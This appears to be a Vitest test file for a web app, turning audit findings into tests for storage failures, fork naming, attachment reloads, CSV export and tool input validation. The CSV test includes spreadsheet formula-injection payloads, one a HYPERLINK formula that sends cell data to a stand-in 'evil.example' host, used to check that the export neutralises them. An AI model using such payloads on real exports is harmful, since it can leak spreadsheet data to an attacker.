// @vitest-environment jsdom
//
// AUDIT FINDINGS — rounds 14-17 (audit-log.md). Each test asserts the behaviour that SHOULD hold.
// Finding numbers match the log.
import { describe, it, expect, vi, afterEach } from 'vitest';
import { useState, useEffect } from 'react';
import { render, screen, cleanup } from '@testing-library/react';
import { readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { ErrorBoundary } from '../src/App';
import { readLocal, readLocalJson, writeLocal } from '../src/storage';
import { forkParent, forkLabel, forkRoot, fmtDur, fmtTok, fmtSpanMs } from '../src/views/Inspector';
import { mapMessages, userOrdinalAt, userMessageServerIndex } from '../src/views/Playground';
import { auditToCsv, FORMULA_LEAD } from '../src/views/Audit';
import { validateToolInput } from '../src/views/Tools';

// A browser that blocks site data: touching localStorage throws. Safari private browsing reports a
// zero quota, so `setItem` alone throws there — hence the two modes.
const blocked = (mode: 'write' | 'all') => {
  const boom = () => { throw new DOMException('denied', 'SecurityError'); };
  Object.defineProperty(globalThis, 'localStorage', {
    configurable: true,
    value: { getItem: mode === 'all' ? boom : () => null, setItem: boom, removeItem: boom },
  });
};
const working = () => Object.defineProperty(globalThis, 'localStorage', {
  configurable: true, value: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
});

// This file replaces the global `localStorage`. Vitest isolates files, but workers can be shared, and
// leaving a broken global behind takes an unrelated file down with it. Restored after every test.
const realStorage = Object.getOwnPropertyDescriptor(globalThis, 'localStorage');
afterEach(() => {
  cleanup();
  if (realStorage) Object.defineProperty(globalThis, 'localStorage', realStorage);
  else working();
});

// ── #32 / #29 — storage must never take the app down ──────────────────────────────────────────
// App.tsx's theme hook read AND wrote bare, at the top of AppShell, so with storage blocked the whole
// Studio rendered the ErrorBoundary card instead of the app — over a colour preference. Workflows'
// preset save did it inside the Run handler, BEFORE the run, so the button silently did nothing.
describe('#32/#29 the app keeps working when storage is blocked', () => {
  it('CONTROL: reads and writes behave normally when storage works', () => {
    working();
    expect(writeLocal('k', 'v')).toBe(true);
    expect(readLocalJson('absent', { a: 1 })).toEqual({ a: 1 });
  });

  it('a throwing write does not propagate — it reports false', () => {
    blocked('write');
    expect(() => writeLocal('gnl-theme', 'dark'), 'a preference must not block work').not.toThrow();
    expect(writeLocal('gnl-theme', 'dark')).toBe(false);
  });

  it('a throwing read does not propagate — it reads as "nothing stored"', () => {
    blocked('all');
    expect(() => readLocal('gnl-theme')).not.toThrow();
    expect(readLocal('gnl-theme')).toBeNull();
    expect(readLocalJson('gnl-wf-presets:x', ['fallback'])).toEqual(['fallback']);
  });

  // NOTE: a test used to sit here that rendered a locally-declared theme hook inside the real
  // ErrorBoundary. It was removed after an audit proved it worthless: reverting App.tsx's hook to
  // bare localStorage — the exact #32 defect — left it green, because the component it rendered was
  // one the test file itself wrote in already-fixed form. It asserted that code the test just wrote
  // does not throw. The rule test below caught that mutation, and is currently the only thing that
  // does; it belongs in ESLint (no-restricted-properties), and should move there rather than away.

  it('no bare localStorage access remains in src/ (the rule itself)', () => {
    const offenders: string[] = [];
    const walk = (dir: string) => {
      for (const e of readdirSync(dir, { withFileTypes: true })) {
        const p = join(dir, e.name);
        if (e.isDirectory()) { walk(p); continue; }
        if (!/\.tsx?$/.test(e.name) || p.endsWith('storage.ts')) continue;
        readFileSync(p, 'utf8').split('\n').forEach((line, i) => {
          if (/localStorage\.(getItem|setItem|removeItem)/.test(line)) offenders.push(`${p.split('/src/')[1]}:${i + 1}`);
        });
      }
    };
    walk(join(__dirname, '..', 'src'));
    expect(offenders, 'outside storage.ts this can take the app down').toEqual([]);
  });
});

// ── #30 — a legal run id containing ':fork:' invented a lineage ───────────────────────────────
// The engine mints raw forks as `${src}:fork:${Date.now()}` (time-travel.ts:264) and does NOT
// reserve the substring — `assertRunIdSafe('orders:fork:daily')` is accepted. Matching on the
// separator alone drew `orders` as the parent of a run that never came from it.
describe("#30 a user-chosen ':fork:' name must not invent a parent", () => {
  it('orders:fork:daily — legal id, no parent', () => {
    expect(forkParent('orders:fork:daily'), 'no such parent exists').toBeNull();
  });
  it('CONTROL: an engine-minted raw fork is still read as one', () => {
    expect(forkParent('orders:fork:1721000000000')).toBe('orders');
  });
  it('CONTROL: an engine-minted derived fork is still read as one', () => {
    const derived = 'run1_' + 'a'.repeat(32) + '#fork-1';
    expect(forkParent(derived)).toBe('run1_' + 'a'.repeat(32));
    expect(forkLabel(derived)).toBe('#fork-1');
    expect(forkRoot(derived)).toBe('run1_' + 'a'.repeat(32));
  });
});

// ── #33 — attachments were never rebuilt from history ─────────────────────────────────────────
// mapMessages read text parts only, so a turn's files vanished on reload and an attachment-ONLY turn
// produced no message at all: its answer sat alone with no visible question above it.
describe('#33 attachments must survive a reload', () => {
  const server = [
    { role: 'user', content: [{ type: 'text', text: 'read this invoice' }, { type: 'image', image: 'data:image/png;base64,AAA' }] },
    { role: 'assistant', content: [{ type: 'text', text: 'sure' }] },
    { role: 'user', content: [{ type: 'image', image: 'data:image/png;base64,BBB' }] },   // attachment ONLY
    { role: 'assistant', content: [{ type: 'text', text: 'The invoice total is 4,812.' }] },
  ];
  it('an attachment-only turn does not vanish from the transcript', () => {
    const users = mapMessages(server).filter((m: any) => m.role === 'user');
    expect(users.length, 'an answer with no visible question').toBe(2);
  });
  it("a text turn's attachment comes back too", () => {
    const first: any = mapMessages(server).find((m: any) => m.role === 'user');
    expect(first?.files, 'Msg declares `files`; the history path never filled it').toBeTruthy();
  });
});

// ── #34 — the FLOW-10 invariant did not hold ──────────────────────────────────────────────────
// The comment justified the local↔server alignment with "0 only when its text is empty — which
// can't happen here". It can: send() proceeds when the prompt is empty but attachments exist, so an
// earlier attachment-only turn shifted every later ordinal and lookup returned -1. The caller stayed
// honest (it warned and refused to truncate), but edit/regenerate quietly stopped working.
describe('#34 edit/regenerate still lines up after an attachment-only turn', () => {
  it("a later turn's server index is found", () => {
    const server = [
      { role: 'user', content: [{ type: 'text', text: 'hello' }] },
      { role: 'assistant', content: [{ type: 'text', text: 'hi' }] },
      { role: 'user', content: [{ type: 'image', image: 'data:image/png;base64,AAA' }] },
      { role: 'assistant', content: [{ type: 'text', text: 'seen' }] },
      { role: 'user', content: [{ type: 'text', text: 'third' }] },
    ];
    const local: any = [                                   // send() appends every turn directly
      { role: 'user', text: 'hello' }, { role: 'assistant', text: 'hi' },
      { role: 'user', text: '', files: [{ name: 'a.png' }] },
      { role: 'assistant', text: 'seen' }, { role: 'user', text: 'third' },
    ];
    const ordinal = userOrdinalAt(local, 4);
    expect(userMessageServerIndex(server, ordinal), '-1 means the feature silently degraded').toBe(4);
  });
});

// ── #35 — the audit CSV did not neutralise spreadsheet formulas ───────────────────────────────
// RFC 4180 quoting is a TRANSPORT escape: the reader strips the quotes and THEN evaluates the cell.
// The `actor` column comes from `actorOf`, which falls back to the caller-supplied `x-gnl-actor`
// header — documented as harmless for attribution, which it is; this is a different axis.
const cells = (line: string): string[] => {           // what a spreadsheet does: unquote, then read
  const out: string[] = []; let cur = ''; let q = false;
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (q) { if (c === '"' && line[i + 1] === '"') { cur += '"'; i++; } else if (c === '"') q = false; else cur += c; }
    else if (c === '"') q = true;
    else if (c === ',') { out.push(cur); cur = ''; }
    else cur += c;
  }
  out.push(cur); return out;
};
describe('#35 audit CSV cells must not open as formulas', () => {
  // Imported, not re-declared: a test that keeps its own copy of the rule cannot fail when the
  // production rule changes.
  for (const payload of ['=1+1', '@SUM(A1)', '=HYPERLINK("http://evil.example/"&A1,"Report")', '+1', '-1+1']) {
    it(`actor=${JSON.stringify(payload).slice(0, 34)} is neutralised`, () => {
      const csv = auditToCsv([{ id: '1', at: 1, actor: payload, org: 'acme', action: 'agent.run', target: 'r-1', detail: undefined } as any]);
      const cell = cells(csv.split('\n')[1])[2];
      expect(FORMULA_LEAD.test(cell), `actor comes from the x-gnl-actor HEADER: ${JSON.stringify(cell)}`).toBe(false);
    });
  }
  it('CONTROL: RFC 4180 quoting still round-trips', () => {
    const csv = auditToCsv([{ id: '1', at: 1, actor: 'alice', org: 'acme', action: 'a', target: 'a,b "c"', detail: undefined } as any]);
    expect(cells(csv.split('\n')[1])[5]).toBe('a,b "c"');
  });
});

// ── #36 — tool input validation ───────────────────────────────────────────────────────────────
// `NaN` was the only rejection: an `integer` field took 3.7, and "Infinity" passed validation and
// then became `null` on the wire, so a REQUIRED field reached the tool as null.
describe('#36 tool input validation', () => {
  const fields = [{ key: 'count', type: 'integer', required: true }];
  it('an integer field rejects a decimal', () => {
    expect(validateToolInput(fields, { count: '3.7' }).ok, '3.7 is not an integer').toBe(false);
  });
  it('Infinity is rejected (it serialises to null)', () => {
    expect(validateToolInput(fields, { count: 'Infinity' }).ok, 'a required field would arrive as null').toBe(false);
    expect(validateToolInput(fields, { count: '1e400' }).ok).toBe(false);
  });
  it('CONTROL: a valid integer passes and plain text is still refused', () => {
    expect(validateToolInput(fields, { count: '42' }).ok).toBe(true);
    expect(validateToolInput(fields, { count: 'abc' }).ok).toBe(false);
  });
});

// ── #31 — formatter boundaries ────────────────────────────────────────────────────────────────
// The minutes were floored and the remainder rounded independently, so the halves could disagree.
describe('#31 formatters must not print impossible values', () => {
  it('fmtDur: when the rounding carries, the base carries with it', () => {
    expect(fmtDur(119_600), 'there is no such duration as "1m 60s"').toBe('2m 0s');
    expect(fmtDur(59_960)).toBe('1m 0s');
  });
  it('fmtTok: the unit is chosen from the ROUNDED value', () => {
    expect(fmtTok(999_999), 'not "1000.0k"').toBe('1.0M');
  });
  it('fmtSpanMs: same family', () => {
    expect(fmtSpanMs(999.6)).toBe('1.00s');
  });
  it('the twins agree — TraceView formats ONE span through both', () => {
    // Inspector.tsx:1323 fmtSpanMs(s.durationMs) and :1387 fmtDur(s.durationMs) are the same object.
    for (const ms of [999.4, 999.6, 1000, 59_960]) {
      const sub = (v: string) => v.endsWith('ms');
      expect(sub(fmtDur(ms)), `fmtDur(${ms})=${fmtDur(ms)} vs fmtSpanMs=${fmtSpanMs(ms)}`)
        .toBe(sub(fmtSpanMs(ms)));
    }
  });
  it('fmtTok does not invent a unit for NaN', () => {
    expect(fmtTok(NaN)).toBe('NaN');
  });
  it('CONTROL: ordinary values are unchanged', () => {
    expect(fmtDur(340)).toBe('340ms');
    expect(fmtDur(1500)).toBe('1.5s');
    expect(fmtDur(119_000)).toBe('1m 59s');
    expect(fmtDur(3_599_000)).toBe('59m 59s');
    expect(fmtTok(312)).toBe('312');
    expect(fmtTok(18_400)).toBe('18.4k');
    expect(fmtTok(1_200_000)).toBe('1.2M');
    expect(fmtSpanMs(340)).toBe('340ms');
  });
});
